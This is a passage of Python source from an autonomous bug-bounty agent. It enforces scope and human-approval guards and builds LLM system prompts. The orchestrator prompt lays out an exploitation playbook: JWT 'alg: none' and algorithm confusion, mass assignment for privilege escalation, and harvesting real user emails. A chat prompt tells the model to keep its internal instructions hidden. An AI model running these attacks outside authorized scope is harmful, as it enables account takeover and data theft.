        # 1b. Enforce per-turn path scope (when a task is scoped to a specific
        # base path, tool calls must not wander into sibling applications on the same host).
        if self._turn_path_scope and tool_name not in ("run_terminal_command", "record_finding", "export_report"):
            url_candidate = args.get("url") or args.get("request_ref")
            if url_candidate and str(url_candidate).startswith(("http://", "https://", "/")):
                if not _url_in_path_scope(str(url_candidate), self._turn_path_scope):
                    # Auto-correct URL if it targeted the active host but omitted the path scope prefix
                    parsed = urlparse(str(url_candidate))
                    clean_scope = "/" + self._turn_path_scope.strip("/.,;:!?)>\"'")
                    if parsed.scheme and parsed.netloc:
                        if self.target.name in parsed.netloc or parsed.netloc in self.target.name:
                            new_path = f"{clean_scope}{parsed.path}"
                            new_url = f"{parsed.scheme}://{parsed.netloc}{new_path}"
                            if parsed.query:
                                new_url += f"?{parsed.query}"
                            if args.get("url"):
                                args["url"] = new_url
                            if args.get("request_ref"):
                                args["request_ref"] = new_url
                            url_candidate = new_url
                            if emit and hasattr(emit, "info"):
                                emit.info(f"Auto-scoped URL to active lab path: {new_url}")
                    elif str(url_candidate).startswith("/"):
                        new_path = f"{clean_scope}{url_candidate}"
                        if args.get("url"):
                            args["url"] = new_path
                        if args.get("request_ref"):
                            args["request_ref"] = new_path
                        url_candidate = new_path
                        if emit and hasattr(emit, "info"):
                            emit.info(f"Auto-scoped URL to active lab path: {new_path}")

                if not _url_in_path_scope(str(url_candidate), self._turn_path_scope):
                    reason = (
                        f"Requested URL '{url_candidate}' is outside the active path scope ('{self._turn_path_scope}'). "
                        f"All tool calls MUST be formatted with the prefix '{self._turn_path_scope}' (e.g. 'https://{self.target.name}{self._turn_path_scope}/dashboard' or 'https://{self.target.name}{self._turn_path_scope}/api/...'). "
                        f"Do NOT send requests to out-of-scope paths."
                    )
                    if emit and hasattr(emit, "warn"):
                        emit.warn(f"[!] PATH SCOPE REFUSAL: {url_candidate} — {reason}")
                    return {
                        "error": f"PATH_SCOPE_VIOLATION: {reason}",
                        "target": str(url_candidate),
                        "blocked": True
                    }

        # 2. Check for disallowed module flags
        if self.target and self.target.scope_rules:
            allowed, reason = check_module_against_rules(tool_name, self.target.scope_rules)
            if not allowed:
                return {
                    "error": f"RULE_VIOLATION: {reason}",
                    "blocked": True
                }

        # 3. Autopilot Guard (CircuitBreaker + SafeMethodPolicy)
        method = str(args.get("method", "GET")).upper()
        url = args.get("url") or (target_candidate if target_candidate.startswith(("http://", "https://")) else f"https://{target_candidate}")
        guard_result = self.guard.check_request(method, url)

        if guard_result.get("decision") == "block":
            reason = guard_result.get("reason", "Target host blocked by circuit breaker")
            if emit and hasattr(emit, "warn"):
                emit.warn(f"[!] GUARD BLOCKED: {reason}")
            return {"error": f"blocked: {reason}", "blocked": True}

        if guard_result.get("decision") == "require_approval":
            reason = guard_result.get("reason", "Method requires human approval")
            if emit and hasattr(emit, "warn"):
                emit.warn(f"[!] GUARD APPROVAL REQUIRED: {reason}")
            return {"error": f"requires human approval: {reason}", "requires_approval": True}

        # 4. Rate Limiter (Pacing)
        is_recon = tool_name in ("subfinder", "dns_bruteforce", "httpx", "dig", "subzy", "vhost_fuzz", "gowitness")
        host = self.guard._extract_host(url)
        self.guard._limiter.wait(host, is_recon=is_recon)

        # 5. Tool Execution & Circuit Breaker status tracking
        try:
            result = spec.executor(args, self.target, emit)
            if isinstance(result, dict) and result.get("error"):
                self.guard.record_failure(host)
            else:
                self.guard.record_success(host)
            return result
        except Exception as e:
            self.guard.record_failure(host)
            return {"error": f"Tool execution failed: {str(e)}"}

    def handle_message(self, user_text: str, session_context: Optional[Dict[str, Any]] = None, emit: Any = None, max_iterations: int = 15, on_token: Optional[Callable[[str], None]] = None, cancel_check: Optional[Callable[[], bool]] = None) -> str:
        """
        Main autonomous reasoning and conversational loop.
        """
        original_user_text = user_text
        if session_context:
            t_name = session_context.get("target") or session_context.get("target_name")
            if t_name and t_name != self.target.name:
                self.set_target(t_name)
            if session_context.get("scope_rules"):
                self.target.scope_rules = session_context["scope_rules"]

        # Check if the user is asking to recon a target without any scope loaded or defined
        from hellhound.core.ai_utils import classify_intent, CHAT_PERSONA_SLM
        intent = classify_intent(user_text)

        lower_text = user_text.lower()
        recon_words = ["recon", "scan", "enumerate", "subdomains", "crawl", "spider", "hunt"]
        has_recon_intent = (intent != "chat") and any(rw in lower_text for rw in recon_words)
        
        # Check if there is a target defined in the prompt or active context
        domain_match = re.search(r'([a-zA-Z0-9][-a-zA-Z0-9]*(?:\.[a-zA-Z0-9][-a-zA-Z0-9]*)*\.[a-zA-Z]{2,})', user_text)
        if domain_match:
            detected_domain = sanitize_target_name(domain_match.group(1))
            if self.target.name == "default" or (self.target.name != detected_domain and "." in detected_domain and self.target.name != detected_domain):
                if self.target.name != detected_domain:
                    self.set_target(detected_domain)
        elif self.target.name == "default" and self.target.scope_rules.in_scope:
            primary_domain = self.target.scope_rules.in_scope[0].lstrip("*.")
            if primary_domain and "." in primary_domain:
                self.set_target(primary_domain)

        # Auto-scope shortcut ONLY when CTF/lab target criteria are met
        if domain_match and is_ctf_auto_scope_eligible(self.target.name, user_text):
            if not self.target.scope_raw or not self.target.scope_rules.in_scope:
                set_scope(self.target, "")  # empty raw_text auto-populates in_scope with [*.target, target]
                if emit and hasattr(emit, "info"):
                    emit.info(
                        f"[*] CTF/lab context detected — auto-scoping to "
                        f"{self.target.name} (no manual /scope needed for lab targets)"
                    )

        # Scope enforcement gate for fresh un-scoped network recon requests
        if has_recon_intent:
            if not self.target.scope_rules.in_scope and not self.target.scope_raw:
                return (
                    f"No authorized scope is defined for '{self.target.name}'. "
                    f"I won't start reconnaissance without it — testing outside scope "
                    f"risks chasing something that's actually disallowed. Provide the "
                    f"program's in-scope/out-of-scope rules first (e.g. `/scope <paste>`)."
                )

        # Hardcoded Capability Question Fast-Path removed.

        # Build System Prompt with registered tools and current target scope
        tools_summary = "\n".join([
            f"- {name}: {spec.description} | Params: {json.dumps(spec.parameters)}"
            for name, spec in TOOL_REGISTRY.items()
        ])

        scope_summary = "None (Default local allow)"
        if self.target.scope_rules.in_scope:
            scope_summary = f"IN-SCOPE: {self.target.scope_rules.in_scope} | OUT-OF-SCOPE: {self.target.scope_rules.out_scope}"

        # Dynamic Skill-Aware Reasoning Injection (for Synthesizer)
        cfg = load_config()
        ai_prov = (cfg.get("synthesizer_provider") or cfg.get("ai_provider") or "ollama").lower()
        is_small = (ai_prov == "ollama")
        skills_block = get_relevant_skills_prompt(
            user_text=user_text,
            history_len=len(self.history),
            has_target=(self.target.name != "default"),
            is_small_model=is_small,
            max_skills=2
        )

        def _get_orchestrator_system_prompt() -> str:
            path_scope_prompt = ""
            if self._turn_path_scope:
                path_scope_prompt = f"\nACTIVE LAB PATH SCOPE: '{self._turn_path_scope}' (ALL tool URLs MUST begin with 'https://{self.target.name}{self._turn_path_scope}/...'; root '/' and other paths are out of scope)\n"

            known_eps = (self.target.state.get("endpoints") or [])[:35]
            known_params = (self.target.state.get("spider_intel") or {}).get("parameters", [])[:15]
            if known_eps:
                intel_block = "Endpoints already discovered:\n" + "\n".join(f"  - {e}" for e in known_eps)
                if known_params:
                    intel_block += "\nParameters already mapped:\n" + "\n".join(f"  - {p}" for p in known_params)
            else:
                intel_block = "(nothing gathered yet this session)"
            try:
                intel_block += "\n\n" + build_investigation_summary(self.target)
            except Exception:
                pass  # memory module is best-effort context, never blocks the loop

            path_rule = ""
            if self._turn_path_scope:
                path_rule = f"\n8. CRITICAL: The active application is scoped strictly to '{self._turn_path_scope}'. All tool URLs MUST start with 'https://{self.target.name}{self._turn_path_scope}/...' (e.g. 'https://{self.target.name}{self._turn_path_scope}/dashboard' or 'https://{self.target.name}{self._turn_path_scope}/api/auth/login'). Never query out-of-scope paths."

            return f"""\
You are HELLHOUND Orchestrator. Your sole job is to evaluate if a tool should be executed next or if tool execution is complete.

TARGET: {self.target.name}
SCOPE: {scope_summary}{path_scope_prompt}

{skills_block}

AVAILABLE TOOLS:
{tools_summary}

ALREADY GATHERED THIS SESSION (do not re-run a tool to re-discover this):
{intel_block}

RULES:
1. ONLY call tools when the user explicitly requests active reconnaissance, scanning, enumeration, or analysis of a target.
2. If the user asks a complex question, hypothetical scenario, asks for cybersecurity advice, or requests a report/summary based on existing findings, do NOT call unnecessary tools. Output "DONE".
3. For greetings, casual questions, or general discussion, do NOT call any tools. Output "DONE".
4. Systematic Route, Script & Client Intelligence Discovery (NEVER GUESS BLIND):
   - When tools return HTML or JSON, check `discovered_script_assets` or script tags (e.g. `/assets/*.js`, `/static/js/*.js`, `main.js`, `app.js`).
   - If JavaScript bundle files are present, you MUST fetch and read the `.js` files using `curl` BEFORE probing or guessing backend API endpoints.
   - Analyze the downloaded JavaScript to extract the real route tables, actual API endpoints (`/api/...`), and client-side authorization conditions.
   - DO NOT run blind directory fuzzers or invent random API paths when the application's actual JavaScript defines the exact endpoints.
5. Evidence-Driven Multi-Vector Testing & Exploitation:
   - Base all attacks on real data structures and routes discovered from application responses and JavaScript analysis.
   - When testing authentication and access control:
     a) Register/Login to establish a valid session, and note the session mechanism (opaque cookie vs JWT).
     b) NEVER attempt JWT attacks (`jwt_forge`, `alg: none`) on opaque session tokens (`sess_...`, `PHPSESSID`, `connect.sid`).
     c) Map and probe the actual authenticated API endpoints identified in the JavaScript (e.g. account update routes, workspace management, user settings).
     d) Deep Mass Assignment: When an endpoint rejects direct modification of top-level fields (e.g. `role`), test the secondary or nested property structures discovered during JavaScript analysis.
     e) Post-Exploitation Verification: When a state-changing request (`PATCH`/`PUT`/`POST`) succeeds (HTTP 200), IMMEDIATELY verify elevated access by re-requesting the previously restricted/forbidden route (e.g. `GET /api/admin/overview` or administrative console) with `curl` to confirm privileged data is now accessible.
     f) If JWTs are used: test unsigned `alg: none` tokens, algorithm confusion (`RS256` -> `HS256`), and claim tampering (`role`, `sub`, `email`).
     g) Pivot across discovered endpoints and HTTP verbs (GET, POST, PUT, PATCH, DELETE).
6. Strict Verification Gate, Visual Proof & Finding Recording (gowitness / record_finding):
   - In modern Single-Page Applications (SPAs), HTTP 200 merely returns the frontend shell. Inspect the response body or screenshot for error states: "403", "Owner access required", "Access Denied", "Forbidden", or login prompts.
   - A privilege escalation or bypass is ONLY confirmed when privileged data (billing secrets, API keys, member directories, configuration settings) is genuinely returned or unlocked.
   - MANDATORY ACTION BEFORE OUTPUTTING 'DONE': Whenever you successfully authenticate, escalate privileges (e.g. customer -> ops_admin/admin/owner), or access internal/restricted tooling:
     1. Capture visual proof of the unlocked page or dashboard using `gowitness`.
     2. Record the confirmed vulnerability and reproduction proof using `record_finding`.
     3. ONLY after executing both tools, output "DONE".
7. To call a tool, respond ONLY with pure JSON (do NOT output natural language commentary or '(Suggested next tool: ...)'):
```json
{{
  "tool": "<tool_name>",
  "args": {{ ... }}
}}
```
8. When testing authentication or password recovery workflows, harvest real user identities/emails from application content or endpoints rather than inventing dummy emails.{path_rule}
9. If no further tools are needed, or after recording all findings and capturing visual proof, respond with "DONE".
"""

        # Build live investigation context summary
        inv_summary = ""
        try:
            inv_summary = build_investigation_summary(self.target)
        except Exception:
            pass

        inv_block = f"\n\n=== INVESTIGATION CONTEXT & MEMORY ===\n{inv_summary}\n" if inv_summary else ""

        path_scope_synth = ""
        if self._turn_path_scope:
            path_scope_synth = f"\nACTIVE PATH SCOPE: '{self._turn_path_scope}'"

        report_requested = any(kw in original_user_text.lower() for kw in ("report", "hackerone", "bug bounty", "poc report", "draft report", "submission", "writeup", "finding", "findings", "proof", "takeover", "summary", "document"))
        has_critical_findings = (
            len(self.target.findings) > 0 
            or any(f.get("severity") in ("CRITICAL", "HIGH", "critical", "high") for f in self.target.findings)
            or bool(self.target.state.get("session_cookie"))
        )

        report_directive = ""
        if report_requested or has_critical_findings:
            report_directive = f"""
CRITICAL INSTRUCTION - VULNERABILITY REPORT & PROOF OF CONCEPT DIRECTIVE:
When a vulnerability (such as Account Takeover, Auth Bypass, JWT Algorithm Confusion, Token Leakage, or IDOR) is confirmed or the researcher requests a report, format your response as a complete, professional, ready-to-submit HackerOne markdown vulnerability report:

# [Vulnerability Title: e.g. Critical Authentication Bypass via Password Reset Token Leakage leading to Account Takeover OR JWT Algorithm Confusion leading to Full Account Takeover]

## Summary
[Concise executive summary of the vulnerability, root cause, and how it was discovered.]

## Vulnerability Classification
- **Vulnerability Type**: Authentication Bypass / Token Leakage / Account Takeover / Improper Cryptographic Signature Verification
- **Weakness**: CWE-640 (Weak Password Recovery Mechanism) / CWE-287 (Improper Authentication) / CWE-347 (Improper Verification of Cryptographic Signature) / CWE-200 (Exposure of Sensitive Information)
- **Severity**: Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H - 9.8)

## Affected Asset & Endpoints
- **Target Host**: `{self.target.name}`
- **Vulnerable Endpoints / Parameters**:
  - Discovered Endpoint / Parameter: `POST/GET https://{self.target.name}{self._turn_path_scope or ''}/...`
  - Discovered Authenticated UI / Dashboard: `GET https://{self.target.name}{self._turn_path_scope or ''}/...`

## Step-by-Step Proof of Concept (PoC)
[Provide exact, reproducible curl commands with real request bodies, forged JWT tokens or reset codes, and response snippets harvested during testing.]

## Evidence & Screenshots
[Detail the captured gowitness visual screenshots in ~/.hellhound/targets/{self.target.name}/screenshots/ and authenticated session tokens demonstrating privileged access to confidential records or administrator settings.]

## Business & Security Impact
[Explain the impact of full account takeover: access to confidential records/PII, unauthorized actions, takeover of administrator/staff accounts, and data exfiltration.]

## Remediation & Mitigation
[Exact developer remediation recommendations, e.g. enforce strict algorithm allowlists rejecting 'none' and symmetric HMAC when expecting asymmetric RSA, deliver tokens strictly via out-of-band email, invalidate tokens on use, enforce rate limits, and sanitize debug previews in production API responses.]
"""

        # ── 2. Comprehensive Synthesizer System Prompt (Deep Reasoning & Synthesis)
        synthesizer_system_prompt = f"""\
You are HELLHOUND, an autonomous bug bounty reconnaissance and triage assistant.
Your role: Provide the researcher with deep, factual analysis, evidence evaluation, severity classification, and actionable bug bounty triage recommendations.

TARGET: {self.target.name}
SCOPE CONSTRAINTS: {scope_summary}{path_scope_synth}
CURRENT FINDINGS: {len(self.target.findings)} verified findings

AVAILABLE TOOLS (this is the complete, real list — you have no other tools):
{tools_summary}

=== ALWAYS-ON BASELINE DOCTRINE ===
{BASELINE_RULES_PROMPT}{inv_block}
{skills_block}
{report_directive}
INSTRUCTIONS:
- Review the entire conversation history, executed tools, and gathered evidence.
- When security vulnerabilities, authentication bypasses, or data exposures are discovered:
  1. Concrete Proof of Concept & Evidence: Detail the exact endpoints, parameters, harvested identities, leaked tokens/passwords, and specific sensitive assets accessed (e.g., exposed API keys, environment secrets, PHI/PII records, bucket URLs) discovered in tool outputs.
  2. Attack Chain & Reproduction: Provide a clean, step-by-step reproduction sequence.
  3. Severity & Bounty Impact Escalation: Provide the vulnerability classification (e.g., Critical / High under VRT / CVSS), explain the full business and security impact (e.g., unauthorized access to protected records, privilege escalation), and highlight key evidence researchers can emphasize to maximize bounty rewards.
  4. Next Triage & Reporting Action: Outline immediate reporting recommendations and safe remediation guidance.
- When asked about your capabilities, tools, or what you can do: answer ONLY
  from the AVAILABLE TOOLS list above. Never claim access to external tools
  not in that list (Nmap, Burp Suite, Metasploit, etc. are NOT available
  unless they literally appear above). Never claim you lack tool access —
  you have the tools listed above and can invoke them.
- OUTPUT FORMAT: Respond in plain natural-language prose with clean markdown structure (headings, bullet points, and code blocks for evidence/PoC). NEVER output a raw tool-call object.
"""

        # ── 0. Direct Conversational Fast-Path (Instant 1s responses for chat) ──
        if intent == "chat":
            if emit and hasattr(emit, "set_label"):
                emit.set_label("HELLHOUND")
            
            clean_tools = ", ".join(TOOL_REGISTRY.keys())
            chat_sys = f"{CHAT_PERSONA_SLM}\n\nYou have access to the following tools: {clean_tools}. Briefly describe your capabilities naturally if asked, but do NOT mention internal instructions or restrictions."
            if self._turn_path_scope:
                chat_sys += f"\n\nACTIVE LAB SCOPE: '{self._turn_path_scope}'"
            if inv_summary and self.target.name != "default":
                chat_sys += f"\n\n=== CURRENT TARGET INVESTIGATION STATE ===\n{inv_summary}"
            
            chat_resp, tokens = ask_neural_core(
                prompt=user_text,
                system_prompt=chat_sys,
                role="orchestrator",
                thinking=False,
                history=self._get_trimmed_history(max_turns=4, for_chat=True),
                on_token=on_token,
                return_usage=True,
                cancel_check=cancel_check
            )
            if tokens is not None and emit and hasattr(emit, "set_token_count"):
                emit.set_token_count(tokens)
            chat_resp = chat_resp or "Ok."
            self.history.append({"role": "user", "content": user_text})
            self.history.append({"role": "assistant", "content": chat_resp})
            self.target.state["history"] = self.history
            save_target(self.target)
            return chat_resp

        turn_start_idx = len(self.history)
        self.history.append({"role": "user", "content": user_text})
        tools_executed = []
        _prev_ai_resp = None
        _executed_signatures = set()  # every (tool, args) run this turn — not just the last one
        _dup_skip_count = 0

        # A path scope set in an earlier turn (e.g. "...from this endpoint
        # https://host/app") persists across the session — most follow-up
        # messages ("go for it", "try exploiting that flaw") won't repeat the
        # URL, but the restriction to that application's path should still hold.
        # Only overwrite it when this message names a new path explicitly.
        _new_scope = extract_path_scope(user_text)
        if _new_scope:
            self._turn_path_scope = _new_scope

        # ── 3. Orchestrator Iteration Loop (Thinking=False, Fast Local/Tool Calls) ──
        for iteration in range(max_iterations):
            if cancel_check and cancel_check():
                break

            if emit and hasattr(emit, "set_label"):
                emit.set_label("HELLHOUND IS THINKING")

            ai_resp, tokens = ask_neural_core(
                prompt=user_text if iteration == 0 else "Continue analysis based on tool results. Choose next tool or output 'DONE'.",
                system_prompt=_get_orchestrator_system_prompt(),
                role="orchestrator",
                thinking=False,
                history=self._get_trimmed_history(max_turns=6, for_chat=False, turn_start_idx=turn_start_idx),
                return_usage=True,
                cancel_check=cancel_check
            )
            
            if tokens is not None and emit and hasattr(emit, "set_token_count"):
                emit.set_token_count(tokens)

            if not ai_resp or not ai_resp.strip():
                break

            # Guard against the orchestrator re-entering with the exact same
            # output it just produced (identical plan/tool-call regenerated
            # instead of progressing) — treat that as "done planning" and
            # fall through to synthesis rather than burning iterations.
            if ai_resp.strip() == (_prev_ai_resp or "").strip():
                break
            _prev_ai_resp = ai_resp

            # Check for JSON tool invocation in the response (markdown, pure JSON, or tool prefix patterns)
            tool_call = None
            json_match = re.search(r'```(?:json)?\s*(\{[\s\S]*?\})\s*```', ai_resp)
            if json_match:
                try:
                    parsed = json.loads(json_match.group(1))
                    if isinstance(parsed, dict) and "tool" in parsed:
                        tool_call = parsed
                except Exception:
                    pass

            if not tool_call:
                tool_json_match = re.search(r'(\{\s*"tool"\s*:\s*[\s\S]*\})', ai_resp)
                if tool_json_match:
                    try:
                        parsed = json.loads(tool_json_match.group(1))
                        if isinstance(parsed, dict) and "tool" in parsed:
                            tool_call = parsed
                    except Exception:
                        pass

            if not tool_call:
                # Catch patterns like: record_finding { ... } or (Suggested next tool: record_finding { ... })
                for reg_tool in TOOL_REGISTRY.keys():
                    pattern = rf'(?:Suggested next tool:\s*)?\b({reg_tool})\b\s*(\{{[\s\S]*\}})'
                    m = re.search(pattern, ai_resp, re.IGNORECASE)
                    if m:
                        t_name_matched = m.group(1).lower()
                        t_args_str = m.group(2).rstrip(" \t\n\r)")
                        try:
                            parsed_args = json.loads(t_args_str)
                            if isinstance(parsed_args, dict):
                                tool_call = {"tool": t_name_matched, "args": parsed_args}
                                break
                        except Exception:
                            pass

            if tool_call and tool_call.get("tool") in TOOL_REGISTRY:
                t_name = tool_call["tool"]
                t_args = tool_call.get("args") or tool_call.get("parameters") or tool_call.get("arguments") or {}

                # Already ran this exact tool+args earlier THIS turn (not just
                # last iteration) -> the orchestrator is repeating itself, not
                # progressing. Stop calling and move to synthesis with what's
                # already gathered, instead of re-crawling and re-saving.
                _sig = (t_name, json.dumps(t_args, sort_keys=True, default=str))
                if _sig in _executed_signatures:
                    _dup_skip_count += 1
                    if _dup_skip_count >= 2:
                        # Repeating itself even after being told not to — stop
                        # burning iterations and move straight to synthesis.
                        break
                    self.history.append({
                        "role": "user",
                        "content": f"[TOOL SKIPPED] '{t_name}' with these exact args already ran earlier this turn — reuse those results instead of repeating it."
                    })
                    user_text = f"You already ran '{t_name}' with identical args. Do not repeat it — synthesize from the results you already have, or choose a different tool/target."
                    continue
                _executed_signatures.add(_sig)

                tools_executed.append(t_name)
                
                if emit and hasattr(emit, "set_label"):
                    emit.set_label(f"EXECUTING {t_name.upper()}")

                if emit and hasattr(emit, "tool_start"):
                    emit.tool_start(t_name, t_args)
                elif emit and hasattr(emit, "info"):
                    emit.info(f"[*] Executing tool: {t_name} with args: {t_args}")

                tool_result = self.execute_tool_call(t_name, t_args, emit)

                if emit and hasattr(emit, "tool_result"):
                    emit.tool_result(t_name, tool_result)

                if emit and hasattr(emit, "set_label"):
                    emit.set_label("ANALYZING RESULTS")

                # Feed result back to conversation
                self.history.append({"role": "assistant", "content": ai_resp})
                self.history.append({
                    "role": "user",
                    "content": f"[TOOL RESULT: {t_name}]\n{json.dumps(tool_result, indent=2)}"
                })
                user_text = f"Tool '{t_name}' returned:\n{json.dumps(tool_result, indent=2)}\nEvaluate these findings."
                continue

            elif tool_call:
                # Hallucinated or unregistered tool name
                unregistered_name = tool_call.get("tool", "unknown")
                if emit and hasattr(emit, "set_label"):
                    emit.set_label("ANALYZING RESULTS")

                self.history.append({"role": "assistant", "content": ai_resp})
                self.history.append({
                    "role": "user",
                    "content": f"[TOOL ERROR] '{unregistered_name}' is not a valid tool. Available tools: {', '.join(TOOL_REGISTRY.keys())}"
                })
                user_text = f"Tool '{unregistered_name}' is invalid. Please select from available tools: {', '.join(TOOL_REGISTRY.keys())}"
                continue

            # Non-tool response / "DONE" / conversational output from orchestrator -> exit tool loop
            break

        # ── 4. Final Answer Generation (Streaming, Fast & Context-Specific) ───────
        if emit and hasattr(emit, "set_label"):
            emit.set_label("FINALIZING RESPONSE")

        cfg = load_config()
        self.last_tool_count = len(tools_executed)

        if not tools_executed:
            if report_requested or has_critical_findings:
                synth_prompt = (
                    f"The researcher requested: \"{original_user_text}\"\n\n"
                    f"Target: '{self.target.name}'.\n"
                    f"Generate the complete, professional HackerOne vulnerability report based on the confirmed findings and evidence gathered for this target."
                )
            else:
                synth_prompt = original_user_text

            final_answer, tokens = ask_neural_core(
                prompt=synth_prompt,
                system_prompt=synthesizer_system_prompt,
                role="synthesizer",
                thinking=False,
                history=self._get_trimmed_history(max_turns=6, for_chat=False, turn_start_idx=turn_start_idx),
                on_token=on_token,
                return_usage=True,
                cancel_check=cancel_check
            )
        else:
            if len(tools_executed) > 0 or report_requested or has_critical_findings:
                synth_prompt = (
                    f"The researcher requested/instructed: \"{original_user_text}\"\n\n"
                    f"Tools executed this turn: {', '.join(tools_executed)}.\n\n"
                    f"CRITICAL: Synthesize all results for target '{self.target.name}' into a complete, professional, deep technical vulnerability breakdown and triage report. Include:\n"
                    f"- Executive Summary & Root Cause: What vulnerability or authorization bypass was identified and how it functions.\n"
                    f"- Step-by-Step Proof of Concept (PoC): Provide exact, reproducible curl commands with real request bodies, headers, JSON payloads, and response snippets harvested during testing.\n"
                    f"- Unlocked Access & Impact: Detail elevated roles (e.g. customer -> ops_admin/owner), exposed tenant data, sensitive endpoints, or internal tooling accessed.\n"
                    f"- Severity Classification & Business Risk (VRT / CVSS rating).\n"
                    f"- Concrete Next Steps for the researcher."
                )
            else:
                synth_prompt = (
                    f"The researcher asked: \"{original_user_text}\"\n\n"
                    f"Synthesize the investigation state for target '{self.target.name}' and provide concrete security recommendations."
                )

            if len(tools_executed) > 0 and cfg.get("show_recaps", True):
                synth_prompt += "\n\nIMPORTANT: Write your complete, detailed analysis, PoC commands, and findings with full markdown formatting first. ONLY on the very last line of your response, add a single summary line in this exact format:\nrecap: Goal was [goal]. Done: [what was accomplished]. Next: [recommended next step]."
            
            final_answer, tokens = ask_neural_core(
                prompt=synth_prompt,
                system_prompt=synthesizer_system_prompt,
                role="synthesizer",
                thinking=False,
                history=self._get_trimmed_history(max_turns=6, for_chat=False, turn_start_idx=turn_start_idx),
                on_token=on_token,
                return_usage=True,
                cancel_check=cancel_check
            )

        if tokens is not None and emit and hasattr(emit, "set_token_count"):
            emit.set_token_count(tokens)

        final_response = final_answer or ai_resp or "Analysis completed. No further actions required."
        final_response = _clean_synthesizer_output(final_response)
        self.history.append({"role": "assistant", "content": final_response})
        self.target.state["history"] = self.history
        save_target(self.target)
        return final_response


# Global singleton agent instance for active session
_global_agent: Optional[Agent] = None

def get_agent(target_name: Optional[str] = None) -> Agent:
    global _global_agent
    name = target_name or (_global_agent.target.name if _global_agent else "default")
    if _global_agent is None:
        _global_agent = Agent(create_or_load_target(name))
    else:
        _global_agent.set_target(name)
    return _global_agent

def handle_message(user_text: str, session_context: Optional[Dict[str, Any]] = None, emit: Any = None, on_token: Optional[Callable[[str], None]] = None) -> str:
    """Entrypoint for conversational chat queries."""
    target_name = (session_context or {}).get("target")
    agent = get_agent(target_name)
    return agent.handle_message(user_text, session_context=session_context, emit=emit, on_token=on_token)
